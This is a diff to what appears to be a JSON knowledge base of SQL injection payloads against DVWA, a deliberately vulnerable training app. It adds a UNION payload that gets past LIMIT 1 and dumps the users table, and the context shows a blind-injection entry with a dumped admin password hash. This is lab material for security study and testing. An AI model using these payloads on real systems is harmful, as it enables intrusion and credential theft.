@@ -13,5 +13,12 @@
     "principle": "数字型注入无引号闭合；布尔盲注以 \"User ID exists\" 字符串作真假基准逐字符拖数据，最终 -D dvwa -T users --dump 拖出 admin:5f4dcc3b5aa765d61d8327deb882cf99",
     "source": "dvwa",
     "verify_url": "http://localhost:8081/vulnerabilities/sqli_blind/ (POST id={payload})"
+  },
+  {
+    "id": "auto-20261030134348",
+    "context": "DVWA SQLi high：注入点不在 /vulnerabilities/sqli/ 本身，而是 POST /vulnerabilities/sqli/session-input.php 的 id 字段存入 $_SESSION['id']，再 GET /vulnerabilities/sqli/ 触发查询 SELECT first_name,last_name FROM users WHERE user_id='<id>' LIMIT 1（2列、单引号、LIMIT 1）。绕过 LIMIT 1：用 AND 1=2 使原行不返回，UNION 行成为首行，再 GROUP_CONCAT 把全表压成一行。",
+    "reference_payload": "id=1' AND 1=2 UNION SELECT GROUP_CONCAT(user SEPARATOR '|'), GROUP_CONCAT(password SEPARATOR '|') FROM users-- -  (POST 到 session-input.php，再 GET /vulnerabilities/sqli/)",
+    "principle": "AND 1=2 消除原行使 UNION 行占 LIMIT 1 名额 + GROUP_CONCAT 合并多行为单行，绕过 LIMIT 1 拖出 users 全表（5用户+MD5 hash）",
+    "source": "dvwa"
   }
 ]
